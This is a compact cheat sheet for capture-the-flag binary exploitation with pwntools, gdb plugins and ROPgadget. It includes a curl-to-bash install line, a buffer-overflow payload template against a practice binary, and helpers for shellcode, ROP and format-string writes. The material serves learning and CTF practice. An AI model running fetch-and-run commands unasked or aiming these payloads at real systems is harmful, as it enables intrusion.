# pwntools, gdb (pwndbg/GEF), checksec, ROPgadget

```bash
pip install pwntools ROPgadget
# gdb plugin: pwndbg (https://github.com/pwndbg/pwndbg) or GEF: bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

## pwntools essentials
```python
from pwn import *
context.binary = e = ELF('./vuln')         # arch, symbols, plt/got
io = process(e.path)  # or remote('pwn1.chal.deti', 9001)  # or gdb.debug(e.path, 'b *vuln+40')
io.recvuntil(b'name?')
io.sendline(b'A'*72 + p64(e.sym['win']))
print(io.recvall(timeout=2).decode(errors='replace'))
```
| Helper | Use |
|---|---|
| `cyclic(200)`, `cyclic_find(0x6161616c)` | find offsets |
| `p64/u64`, `p32/u32` | pack/unpack little-endian |
| `ELF(...).sym/.plt/.got`, `next(e.search(b'/bin/sh'))` | addresses |
| `ROP(e).find_gadget(['pop rdi','ret'])` | gadgets |
| `asm(shellcraft.sh())` | shellcode |
| `fmtstr_payload(off, {addr: val})` | format-string writes |
| `checksec` / `pwn checksec vuln` | protections |

## gdb (with pwndbg)
`r < input.bin`, `b *main+50`, `c`, `ni`/`si`, `x/20gx $rsp`, `info frame`, `disass vuln`,
`cyclic 200` + `cyclic -l <value>` (pwndbg), `vmmap`, `got`, `telescope $rsp`.

ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`; `ropper -f vuln --search 'pop rdi'`.
